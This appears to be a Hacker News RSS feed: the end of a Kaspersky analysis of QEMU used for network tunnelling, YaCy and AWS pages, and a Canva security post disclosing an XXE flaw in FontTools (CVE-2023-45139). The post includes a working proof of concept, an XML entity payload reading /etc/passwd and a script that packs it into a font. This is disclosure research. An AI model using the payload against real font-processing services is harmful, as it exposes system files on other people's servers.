<div id="attachment_111807"><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153331/QEMU_persistence_02.png"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-111807" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153331/QEMU_persistence_02.png" alt="Subnet scan output" width="739" height="483" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153331/QEMU_persistence_02.png 739w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153331/QEMU_persistence_02-300x196.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153331/QEMU_persistence_02-536x350.png 536w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153331/QEMU_persistence_02-428x280.png 428w" sizes="(max-width: 739px) 100vw, 739px"></a></p><p id="caption-attachment-111807">Subnet scan output</p></div>
<p>The scan located InternalHost, with the IP address 192.168.56.109. The Nmap utility showed that port 3389 was open. We tried connecting to InternalHost using RDP.</p>
<div id="attachment_111808"><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03.png"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-111808" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03-1024x593.png" alt="Successful RDP connection to InternalHost" width="1024" height="593" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03-1024x593.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03-300x174.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03-768x445.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03-604x350.png 604w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03-740x428.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03-484x280.png 484w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03-800x463.png 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153416/QEMU_persistence_03.png 1038w" sizes="(max-width: 1024px) 100vw, 1024px"></a></p><p id="caption-attachment-111808">Successful RDP connection to InternalHost</p></div>
<p>Thus, we were able to ascertain that this technique for achieving network access was indeed effective. In addition to the aforementioned types of network devices, QEMU supports several others, which can also be employed by malicious actors.</p>
<h2 id="qemu-network-traffic-analysis">QEMU network traffic analysis</h2>
<p>QEMU does not use any extra encryption when tunneling traffic. It transmits encapsulated packets unencrypted: the application-level packet data sent to the server contains the size of the encapsulated Ethernet frame (4 bytes, outlined in yellow in the image below), followed by the Ethernet frame itself (outlined in red).</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153449/QEMU_persistence_04.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153449/QEMU_persistence_04-1024x131.png" alt="Example of an encapsulated Ethernet frame" width="1024" height="131" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153449/QEMU_persistence_04-1024x131.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153449/QEMU_persistence_04-300x38.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153449/QEMU_persistence_04-768x98.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153449/QEMU_persistence_04-740x94.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153449/QEMU_persistence_04-800x102.png 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153449/QEMU_persistence_04.png 1222w" sizes="(max-width: 1024px) 100vw, 1024px"></a></p>
<div id="attachment_111810"><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153514/QEMU_persistence_05.png"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-111810" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153514/QEMU_persistence_05.png" alt="Example of an encapsulated Ethernet frame" width="910" height="277" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153514/QEMU_persistence_05.png 910w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153514/QEMU_persistence_05-300x91.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153514/QEMU_persistence_05-768x234.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153514/QEMU_persistence_05-740x225.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153514/QEMU_persistence_05-800x244.png 800w" sizes="(max-width: 910px) 100vw, 910px"></a></p><p id="caption-attachment-111810">Example of an encapsulated Ethernet frame</p></div>
<p>The size of the encapsulated Ethernet frame in the image above is 89 (0x59) bytes. That value is immediately followed by the encapsulated Ethernet frame.</p>
<p>Having a traffic dump, which had been intercepted on PivotHost in that case, we could obtain the encapsulated traffic by removing the first 58 bytes (for TCP: 14 bytes for Ethernet + 20 bytes for IP + 20 bytes for TCP headers + 4 for internal packet size). This could be done with the editcap utility from the Wireshark package after removing all packets that contained no encapsulated traffic from the PCAP file.</p>
		<div id="crayon-65e8229cd5fbd264815333" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>editcap</span><span>.</span><span>exe</span><span> </span>-<span>L</span><span> </span>-<span>C</span><span> </span><span>58</span><span> </span><span>original</span><span>.</span><span>pcap </span><span>extracted_traffic</span><span>.</span><span>pcap</span></p></div></td>
					</tr>
				</tbody></table>
			</div><p>
The result was a PCAP file containing the traffic that had been sent through the tunnel.</p>
<p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06.png" alt="Original packet transmitted through the tunnel" width="926" height="400" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06.png 926w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06-300x130.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06-768x332.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06-810x350.png 810w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06-740x320.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06-648x280.png 648w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153622/QEMU_persistence_06-800x346.png 800w" sizes="(max-width: 926px) 100vw, 926px"></a></p>
<div id="attachment_111812"><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153651/QEMU_persistence_07.png"><img loading="lazy" decoding="async" aria-describedby="caption-attachment-111812" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153651/QEMU_persistence_07.png" alt="Original packet transmitted through the tunnel" width="675" height="124" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153651/QEMU_persistence_07.png 675w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/01/23153651/QEMU_persistence_07-300x55.png 300w" sizes="(max-width: 675px) 100vw, 675px"></a></p><p id="caption-attachment-111812">Original packet transmitted through the tunnel</p></div>
<h2 id="conclusion">Conclusion</h2>
<p>Malicious actors using legitimate tools to perform various attack steps is nothing new to incident response professionals. Yet we have to admit that attackers sometimes come up with ingenious applications for unlikely software, as was the case with QEMU. This further supports the concept of multi-level protection, which covers both reliable endpoint protection, and specialized solutions for detecting and protecting against complex and targeted attacks including human-operated ones. Only comprehensive security that includes 24/7 network (NDR, NGFW) and endpoint (EDR, EPP) monitoring, by SOC experts for one, can detect anomalies in a timely manner and block an attack in its initial stage. Our MDR service is already capable of detecting the kind of suspicious QEMU activity in question, and appropriate IDS rules have been added to the KATA platform with the verdict <strong>Backdoor.Agent.QEMU.C&amp;C</strong>.</p>
												</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[YaCy, a distributed Web Search Engine, based on a peer-to-peer network (214 pts)]]></title>
            <link>https://yacy.net/</link>
            <guid>39612950</guid>
            <pubDate>Wed, 06 Mar 2024 06:33:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://yacy.net/">https://yacy.net/</a>, See on <a href="https://news.ycombinator.com/item?id=39612950">Hacker News</a></p>
<div id="readability-page-1" class="page">
    
    
    
    
    
    
    
    
    

    

    <div role="main">


<div>
  <p><img src="https://yacy.net/img/YaCyLogo2011_240.png" alt="YaCy" width="240"></p><h2>Search Engine Software</h2>
</div>

<h2 id="yacy-is-free-software-for-your-own-search-engine">YaCy is free software for your own search engine.</h2>
<p>Join a community of search engines or make your own search portal!</p>
<p>There are these three use cases you can choose from:</p>
<div>
        <div id="mode-p2p">
          <h2>P2P Mode</h2>
      <p><img src="https://yacy.net/img/usecase_freeworld.png" alt="YaCy Use Case: Freeworld"></p><p>Web Search by the people, for the people: decentralized, all users are equal, no central, no search request storage, shared index.</p>
        </div>
        <div id="mode-portal">
          <h2>Your Search Portal</h2>
      <p><img src="https://yacy.net/img/usecase_webportal.png" alt="YaCy Use Case: Web Portal"></p><p>Your YaCy installation is independent from other peers. Define your own web index and starting your own web crawl.</p>
       </div>
        <div id="mode-intranet">
          <h2>Intranet Search</h2>
      <p><img src="https://yacy.net/img/usecase_intranet.png" alt="YaCy Use Case: Intranet"></p><p>Create a search portal for your intranet or web pages or your (shared) file system.</p><br>
        </div>
      </div>



<h2 id="decentralization">Decentralization</h2>
<p>Imagine if, rather than relying on the proprietary software of a large professional search engine operator, your search engine was run across many private devices, not under the control of any one company or individual. Well, that's what YaCy does!</p>
<p>Here is a live image of the YaCy network:</p>
<p><img alt="YaCy P2P Network" src="https://yacy.searchlab.eu/NetworkPicture.png?width=960&amp;height=720&amp;bgcolor=2C3E4F&amp;pal=10080&amp;pol=10080&amp;coronaangle=120"></p>
<h2 id="installation-is-easy">Installation is easy!</h2>
<p>The installation takes only three minutes. Just download the release, decompress the package and run the start script.</p>
<p>Next Steps:</p>
<p><a href="https://yacy.net/download_installation/" role="button">Download and Install YaCy</a>
<a href="https://yacy.net/demonstration_tutorial_screenshot/" role="button">Watch screenshots and tutorial movies</a>
<a href="https://yacy.searchlab.eu/Status.html" role="button">Try out the YaCy Demo Peer</a>
</p></div>

    
    
    
    

</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Alan Kay's talk at UCLA – Feb 21, 2024 [video] (137 pts)]]></title>
            <link>https://www.youtube.com/watch?v=dZQ7x0-MZcI</link>
            <guid>39612799</guid>
            <pubDate>Wed, 06 Mar 2024 06:03:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.youtube.com/watch?v=dZQ7x0-MZcI">https://www.youtube.com/watch?v=dZQ7x0-MZcI</a>, See on <a href="https://news.ycombinator.com/item?id=39612799">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Realtime telemetry from ISS internal components (114 pts)]]></title>
            <link>https://iss-mimic.github.io/Mimic/</link>
            <guid>39612640</guid>
            <pubDate>Wed, 06 Mar 2024 05:28:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://iss-mimic.github.io/Mimic/">https://iss-mimic.github.io/Mimic/</a>, See on <a href="https://news.ycombinator.com/item?id=39612640">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Free data transfer out to internet when moving out of AWS (222 pts)]]></title>
            <link>https://aws.amazon.com/blogs/aws/free-data-transfer-out-to-internet-when-moving-out-of-aws/</link>
            <guid>39612607</guid>
            <pubDate>Wed, 06 Mar 2024 05:22:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://aws.amazon.com/blogs/aws/free-data-transfer-out-to-internet-when-moving-out-of-aws/">https://aws.amazon.com/blogs/aws/free-data-transfer-out-to-internet-when-moving-out-of-aws/</a>, See on <a href="https://news.ycombinator.com/item?id=39612607">Hacker News</a></p>
<div id="readability-page-1" class="page"><article vocab="https://schema.org/" typeof="TechArticle"> 
      <meta property="inLanguage" content="en-US"> 
      <meta property="image" content="https://d2908q01vomqb2.cloudfront.net/da4b9237bacccdf19c0760cab7aec4a8359010b0/2024/02/05/Free-DTO-Featured-Image-800x400-1.png"> 
       
       
      <section property="articleBody"> 
       <div id="amazon-polly-audio-tab"> 
            
            
            
           <p><a href="https://aws.amazon.com/polly/" target="_blank" rel="noopener noreferrer"><img src="https://a0.awsstatic.com/aws-blog/images/Voiced_by_Amazon_Polly_EN.png" alt="Voiced by Polly" width="554" height="56"></a> 
           </p> </div> 
       <p>You told us one of the primary reasons to adopt Amazon Web Services (AWS) is the broad choice of services we offer, enabling you to innovate, build, deploy, and monitor your workloads. AWS has continuously expanded its services to support virtually any cloud workload. It now offers over 200 fully featured services for compute, storage, databases, networking, analytics, machine learning (ML) and artificial intelligence (AI), and many more. For example, <a href="https://aws.amazon.com/ec2/">Amazon Elastic Compute Cloud (Amazon EC2)</a> offers over 750 generally available instances—more than any other major cloud provider—and you can choose from <a href="https://aws.amazon.com/getting-started/decision-guides/databases-on-aws-how-to-choose/">numerous relational, analytics, key-value, document, or graph databases</a>.</p> 
       <p>We believe this choice must include the one to migrate your data to another cloud provider or on-premises. That’s why, starting today, we’re waiving data transfer out to the internet (DTO) charges when you want to move outside of AWS.</p> 
       <p>Over 90 percent of our customers already incur no data transfer expenses out of AWS because <a href="https://aws.amazon.com/blogs/aws/aws-free-tier-data-transfer-expansion-100-gb-from-regions-and-1-tb-from-amazon-cloudfront-per-month/">we provide 100 gigabytes per month free from AWS Regions to the internet</a>. This includes traffic from Amazon EC2, <a href="https://aws.amazon.com/s3/">Amazon Simple Storage Service (Amazon S3)</a>, <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/introduction.html">Application Load Balancer</a>, among others. In addition, we offer one terabyte of free data transfer out of <a href="https://aws.amazon.com/cloudfront/">Amazon CloudFront</a> every month.</p> 
       <p>If you need more than 100 gigabytes of data transfer out per month while transitioning, you can contact <a href="https://aws.amazon.com/contact-us/">AWS Support</a> to ask for free DTO rates for the additional data. It’s necessary to go through support because you make hundreds of millions of data transfers each day, and we generally do not know if the data transferred out to the internet is a normal part of your business or a one-time transfer as part of a switch to another cloud provider or on premises.</p> 
       <p>We will review requests at the AWS account level. Once approved, we will provide credits for the data being migrated. We don’t require you to close your account or change your relationship with AWS in any way. You’re welcome to come back at any time. We will, of course, apply additional scrutiny if the same AWS account applies multiple times for free DTO.</p> 
       <p>We believe in customer choice, including the choice to move your data out of AWS. The waiver on data transfer out to the internet charges also follows the direction set by the <a href="https://digital-strategy.ec.europa.eu/en/news/european-data-act-enters-force-putting-place-new-rules-fair-and-innovative-data-economy">European Data Act</a> and is available to all AWS customers around the world and from any AWS Region.</p> 
       <p>Freedom of choice is not limited to data transfer rates. AWS also supports <a href="https://www.fairsoftware.cloud/principles/">Fair Software Licensing Principles</a>, which make it easy to use software with other IT providers of your choice. <a href="https://aws.amazon.com/blogs/networking-and-content-delivery/promoting-customer-choice-aws-takes-another-step-to-lower-costs-for-customers-changing-it-providers/">You can read this blog post for more details.</a></p> 
       <p>You can check the<a href="https://aws.amazon.com/ec2/faqs/#Data_transfer_fees_when_moving_all_data_off_AWS"> FAQ for more information</a>, or <a href="https://aws.amazon.com/contact-us/">you can contact AWS Customer Support</a> to request credits for DTO while switching.</p> 
       <p>But I sincerely hope you will not.</p> 
       <a href="https://twitter.com/sebsto">-- seb</a> 
       <!-- '"` --> 
      </section> 
       
       
       
     </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Fonts are still a Helvetica of a Problem (162 pts)]]></title>
            <link>https://www.canva.dev/blog/engineering/fonts-are-still-a-helvetica-of-a-problem/</link>
            <guid>39612484</guid>
            <pubDate>Wed, 06 Mar 2024 04:57:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.canva.dev/blog/engineering/fonts-are-still-a-helvetica-of-a-problem/">https://www.canva.dev/blog/engineering/fonts-are-still-a-helvetica-of-a-problem/</a>, See on <a href="https://news.ycombinator.com/item?id=39612484">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-page-content="true"><p>At <a target="_new" href="https://www.canva.com/">Canva</a>, we’re continuously looking for ways
to uplift the security of our processes, software, supply chain, and tools on
our road to building the world’s most trusted platform. Canva processes
millions of files across a broad range of graphics formats every day. To help
us do this effectively, we use many open source tools and libraries.
Building on existing research, we thought to look at less explored attack
surfaces, such as fonts that present a complex and prevalent part of graphics
processing.</p>
<p>The following sections describe some vulnerabilities we discovered while
exploring this line of thinking and demonstrate how security issues manifest in
font processing tools.</p>
<h2 id="prior-art">Prior art</h2>
<p>Fonts have a <a target="_new" href="https://simoncozens.github.io/fonts-and-layout/history.html">long and convoluted history</a>
that predates computing by many years, for example, the early printing press.
When bitmaps first brought fonts to the digital realm, few could imagine where
we’d end up today.</p>
<p><span><span></span><img alt="a-brief-history-of-fonts" loading="lazy" width="708" height="1289" decoding="async" data-nimg="1" src="https://www.canva.dev/_next/static/media/font-history-breakdown.3c546dba.png"><span></span></span></p>
<p>The current font landscape contains many specifications, each created for unique
use cases as required by corporations and individuals alike. This situation
leaves font processing software developers with a difficult challenge, requiring
them to interpret <a target="_new" href="https://learn.microsoft.com/en-gb/typography/opentype/spec/overview">vast specifications</a>
across many formats. Where there is such complexity, there is also plenty of
attack surface.</p>
<p>This is not a new idea. In 2015, Google’s <a target="_new" href="https://googleprojectzero.blogspot.com/p/about-project-zero.html">Project Zero</a>
released a <a target="_new" href="https://googleprojectzero.blogspot.com/2015/07/one-font-vulnerability-to-rule-them-all.html">series of blogs</a>
around font security vulnerability research, and the following year, <a target="_new" href="https://googleprojectzero.blogspot.com/2016/06/a-year-of-windows-kernel-font-fuzzing-1_27.html">some blogs</a>
focused on fuzzing for font handling vulnerabilities in the Windows kernel.
In response to this research, the community made some significant changes,
including creating the <a target="_new" href="https://github.com/khaledhosny/ots">OpenType Sanitizer</a>
project and its usage in Chrome and Firefox.</p>
<p>Although the previous research focused primarily on memory corruption bugs in
font processing, we wondered what other kinds of security issues might occur
when handling fonts.</p>
<h2 id="fonts-and-svgs">Fonts and SVGs</h2>
<p>The attack surface of SVG and XML parsers is a well-documented problem in the
web security field (see <a target="_new" href="https://portswigger.net/web-security/xxe">PortSwigger</a>
and <a target="_new" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP</a>).
However, we were surprised to discover that the SVG format also appears in
digital typography in two unique ways.</p>
<p>Font formats that follow the <a target="_new" href="https://en.wikipedia.org/wiki/SFNT">sfnt</a> container
structure, like <a target="_new" href="https://learn.microsoft.com/en-us/typography/opentype/spec/otff#required-tables">OpenType</a>
and <a target="_new" href="https://developer.apple.com/fonts/TrueType-Reference-Manual/RM06/Chap6.html#:~:text=Table%202%3A%20The%20required%20tables">TrueType</a>,
contain a number of tables needed for the font to work as intended. However,
there are also many auxiliary tables, some of which are poorly documented or
proprietary. One such auxiliary table is the SVG table.</p>
<p>The <a target="_new" href="https://learn.microsoft.com/en-gb/typography/opentype/spec/svg">SVG table</a>
supports supplying SVG definitions for glyphs in a font and is one of several
ways color fonts are supported.</p>
<p>Alternatively, it’s also possible, although <a target="_new" href="https://www.w3.org/TR/SVG/fonts.html#FontElement">deprecated</a>
(as of SVG 2), to define a font under the SVG specification itself. Such fonts
are called SVG fonts. SVG fonts arose from a desire to support font description
capabilities under SVG while web fonts (WOFF) were <a target="_new" href="https://developer.mozilla.org/en-US/docs/Web/SVG/Tutorial/SVG_fonts">still being adopted</a>.
To embed a font in an SVG, the <code>&lt;font&gt;</code> element is used along with some other
ingredients like a <code>&lt;font-face-src&gt;</code>, which points to the actual font definition
(for example, a local TTF file).</p>
<p>We wondered then if we could reproduce well-understood SVG and XML handling
vulnerabilities in the world of font processing.</p>
<h2 id="gained-in-translation-cve-2023-45139">Gained in translation - CVE-2023-45139</h2>
<p>Fonts have the potential to be quite large, especially when they support a
large variety of scripts (languages) or contain many glyphs like CJK
(China, Japan, Korea) fonts. Two common performance-enhancing operations are
compression and subsetting.</p>
<p>Font compression is an important optimization that is largely achieved by
converting TrueType and OpenType fonts to the WOFF format.</p>
<p>Subsetting takes a specific selection of a font’s glyphs (a subset) and extracts
them to a standalone file. A great use case for subsetting is removing unneeded
scripts from a font when the client’s desired language is known. In such a case,
only the glyphs required to represent the characters in a client’s language need
be sent to the client’s browser.</p>
<p><span><span></span><img alt="subsetting illustration" loading="lazy" width="1633" height="747" decoding="async" data-nimg="1" src="https://www.canva.dev/_next/static/media/subset-poc.43019d84.png"><span></span></span></p>
<p><a target="_new" href="https://github.com/fonttools/fonttools">FontTools</a> is a Pythonic do-it-all
utility for working with fonts. Although subsetting can be a relatively naive
operation (simply extracting glyphs matching a Unicode or character range),
FontTools’ implementation performs additional size-reducing optimizations.</p>
<p>FontTools <a target="_new" href="https://github.com/fonttools/fonttools/releases/tag/4.28.2">version 4.28.2</a>
added support for subsetting the SVG table for use in glyph coloring. To do this,
the SVG table needs to be parsed to extract <code>glyphIds</code> matching those specified
to be included in the subset.</p>
<p>Looking at how FontTools processes the SVG table in OTF fonts, we can see that
by default, the <a target="_new" href="https://lxml.de/">lxml</a> XML parser <a target="_new" href="https://lxml.de/apidoc/lxml.etree.html#lxml.etree.XMLParser">resolves entities</a>.
So, if the parser walks an untrusted XML file, an XML External Entity (XXE)
vulnerability occurs.</p>
<div><pre><p><span>svg </span><span>=</span><span> etree</span><span>.</span><span>fromstring</span><span>(</span><span></span></p><p><span>    doc</span><span>.</span><span>data</span><span>.</span><span>encode</span><span>(</span><span>"utf-8"</span><span>)</span><span>,</span><span></span></p><p><span>    parser</span><span>=</span><span>etree</span><span>.</span><span>XMLParser</span><span>(</span><span></span></p><p><span>        huge_tree</span><span>=</span><span>True</span><span>,</span><span></span></p><p><span>        remove_blank_text</span><span>=</span><span>True</span><span>,</span><span></span></p><p><span>    </span><span>)</span><span>,</span><span></span></p><p><span></span><span>)</span></p></pre></div>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>Knowing the XML parser used for subsetting the SVG table is misconfigured to
allow for the resolution of arbitrary entities, we can construct an XML payload
to include <code>/etc/passwd</code>.</p>
<div><pre><p><span>&lt;?xml version="1.0"?&gt;</span><span></span></p><p><span></span><span>&lt;!</span><span>DOCTYPE</span><span> </span><span>svg</span><span> </span><span>[</span><span>&lt;!ENTITY poc SYSTEM 'file:///etc/passwd'&gt;</span><span>]</span><span>&gt;</span><span></span></p><p><span></span><span>&lt;</span><span>svg</span><span> </span><span>xmlns</span><span>=</span><span>"</span><span>http://www.w3.org/2000/svg</span><span>"</span><span> </span><span>xmlns:</span><span>xlink</span><span>=</span><span>"</span><span>http://www.w3.org/1999/xlink</span><span>"</span><span>&gt;</span><span></span></p><p><span>  </span><span>&lt;</span><span>g</span><span> </span><span>id</span><span>=</span><span>"</span><span>glyph1</span><span>"</span><span>&gt;</span><span></span></p><p><span>    </span><span>&lt;</span><span>text</span><span> </span><span>font-size</span><span>=</span><span>"</span><span>10</span><span>"</span><span> </span><span>x</span><span>=</span><span>"</span><span>0</span><span>"</span><span> </span><span>y</span><span>=</span><span>"</span><span>10</span><span>"</span><span>&gt;</span><span>&amp;poc;</span><span>&lt;/</span><span>text</span><span>&gt;</span><span></span></p><p><span>  </span><span>&lt;/</span><span>g</span><span>&gt;</span><span></span></p><p><span></span><span>&lt;/</span><span>svg</span><span>&gt;</span></p></pre></div>
<p>We then need to pack the <a target="_new" href="https://learn.microsoft.com/en-us/typography/opentype/spec/svg#svg-capability-requirements-and-restrictions">XML definition into the SVG table</a>
so that it’s valid enough to be subset by FontTools. We can write a script to
help us here by repurposing an existing FontTools <a target="_new" href="https://github.com/fonttools/fonttools/blob/main/Tests/subset/subset_test.py">integration test</a>
to quickly create a valid font.</p>
<div><pre><p><span>from</span><span> string </span><span>import</span><span> ascii_letters</span></p><p><span></span><span>from</span><span> fontTools</span><span>.</span><span>fontBuilder </span><span>import</span><span> FontBuilder</span></p><p><span></span><span>from</span><span> fontTools</span><span>.</span><span>pens</span><span>.</span><span>ttGlyphPen </span><span>import</span><span> TTGlyphPen</span></p><p><span></span><span>from</span><span> fontTools</span><span>.</span><span>ttLib </span><span>import</span><span> newTable</span></p><p><span>XXE_SVG </span><span>=</span><span> </span><span>"""\</span></p><p><span>&lt;?xml version="1.0"?&gt;</span></p><p><span>&lt;!DOCTYPE svg [&lt;!ENTITY poc SYSTEM 'file:///etc/passwd'&gt;]&gt;</span></p><p><span>&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;</span></p><p><span>  &lt;g id="glyph1"&gt;</span></p><p><span>    &lt;text font-size="10" x="0" y="10"&gt;&amp;poc;&lt;/text&gt;</span></p><p><span>  &lt;/g&gt;</span></p><p><span>&lt;/svg&gt;</span></p><p><span>"""</span><span></span></p><p><span></span><span>def</span><span> </span><span>main</span><span>(</span><span>)</span><span>:</span><span></span></p><p><span>    glyph_order </span><span>=</span><span> </span><span>[</span><span>".notdef"</span><span>]</span><span> </span><span>+</span><span> </span><span>list</span><span>(</span><span>ascii_letters</span><span>)</span><span></span></p><p><span>    pen </span><span>=</span><span> TTGlyphPen</span><span>(</span><span>glyphSet</span><span>=</span><span>None</span><span>)</span><span></span></p><p><span>    pen</span><span>.</span><span>moveTo</span><span>(</span><span>(</span><span>0</span><span>,</span><span> </span><span>0</span><span>)</span><span>)</span><span></span></p><p><span>    pen</span><span>.</span><span>lineTo</span><span>(</span><span>(</span><span>0</span><span>,</span><span> </span><span>500</span><span>)</span><span>)</span><span></span></p><p><span>    pen</span><span>.</span><span>lineTo</span><span>(</span><span>(</span><span>500</span><span>,</span><span> </span><span>500</span><span>)</span><span>)</span><span></span></p><p><span>    pen</span><span>.</span><span>lineTo</span><span>(</span><span>(</span><span>500</span><span>,</span><span> </span><span>0</span><span>)</span><span>)</span><span></span></p><p><span>    pen</span><span>.</span><span>closePath</span><span>(</span><span>)</span><span></span></p><p><span>    glyph </span><span>=</span><span> pen</span><span>.</span><span>glyph</span><span>(</span><span>)</span><span></span></p><p><span>    glyphs </span><span>=</span><span> </span><span>{</span><span>g</span><span>:</span><span> glyph </span><span>for</span><span> g </span><span>in</span><span> glyph_order</span><span>}</span><span></span></p><p><span>    fb </span><span>=</span><span> FontBuilder</span><span>(</span><span>unitsPerEm</span><span>=</span><span>1024</span><span>,</span><span> isTTF</span><span>=</span><span>True</span><span>)</span><span></span></p><p><span>    fb</span><span>.</span><span>setupGlyphOrder</span><span>(</span><span>glyph_order</span><span>)</span><span></span></p><p><span>    fb</span><span>.</span><span>setupCharacterMap</span><span>(</span><span>{</span><span>ord</span><span>(</span><span>c</span><span>)</span><span>:</span><span> c </span><span>for</span><span> c </span><span>in</span><span> ascii_letters</span><span>}</span><span>)</span><span></span></p><p><span>    fb</span><span>.</span><span>setupGlyf</span><span>(</span><span>glyphs</span><span>)</span><span></span></p><p><span>    fb</span><span>.</span><span>setupHorizontalMetrics</span><span>(</span><span>{</span><span>g</span><span>:</span><span> </span><span>(</span><span>500</span><span>,</span><span> </span><span>0</span><span>)</span><span> </span><span>for</span><span> g </span><span>in</span><span> glyph_order</span><span>}</span><span>)</span><span></span></p><p><span>    fb</span><span>.</span><span>setupHorizontalHeader</span><span>(</span><span>)</span><span></span></p><p><span>    fb</span><span>.</span><span>setupOS2</span><span>(</span><span>)</span><span></span></p><p><span>    fb</span><span>.</span><span>setupPost</span><span>(</span><span>)</span><span></span></p><p><span>    fb</span><span>.</span><span>setupNameTable</span><span>(</span><span>{</span><span>"familyName"</span><span>:</span><span> </span><span>"TestSVG"</span><span>,</span><span> </span><span>"styleName"</span><span>:</span><span> </span><span>"Regular"</span><span>}</span><span>)</span><span></span></p><p><span>    svg_table </span><span>=</span><span> newTable</span><span>(</span><span>"SVG "</span><span>)</span><span></span></p><p><span>    svg_table</span><span>.</span><span>docList </span><span>=</span><span> </span><span>[</span><span></span></p><p><span>       </span><span>(</span><span>XXE_SVG</span><span>,</span><span> </span><span>1</span><span>,</span><span> </span><span>12</span><span>)</span><span></span></p><p><span>    </span><span>]</span><span></span></p><p><span>    fb</span><span>.</span><span>font</span><span>[</span><span>"SVG "</span><span>]</span><span> </span><span>=</span><span> svg_table</span></p><p><span>    fb</span><span>.</span><span>font</span><span>.</span><span>save</span><span>(</span><span>'poc-payload.ttf'</span><span>)</span><span></span></p><p><span></span><span>if</span><span> __name__ </span><span>==</span><span> </span><span>'__main__'</span><span>:</span><span></span></p><p><span>    main</span><span>(</span><span>)</span></p></pre></div>
<p>When we run the produced <code>poc-payload.ttf</code> against the FontTools subsetting
utility, it produces a subsetted font with the following SVG table, which
includes the entity resolved to the <code>/etc/passwd</code> file.</p>
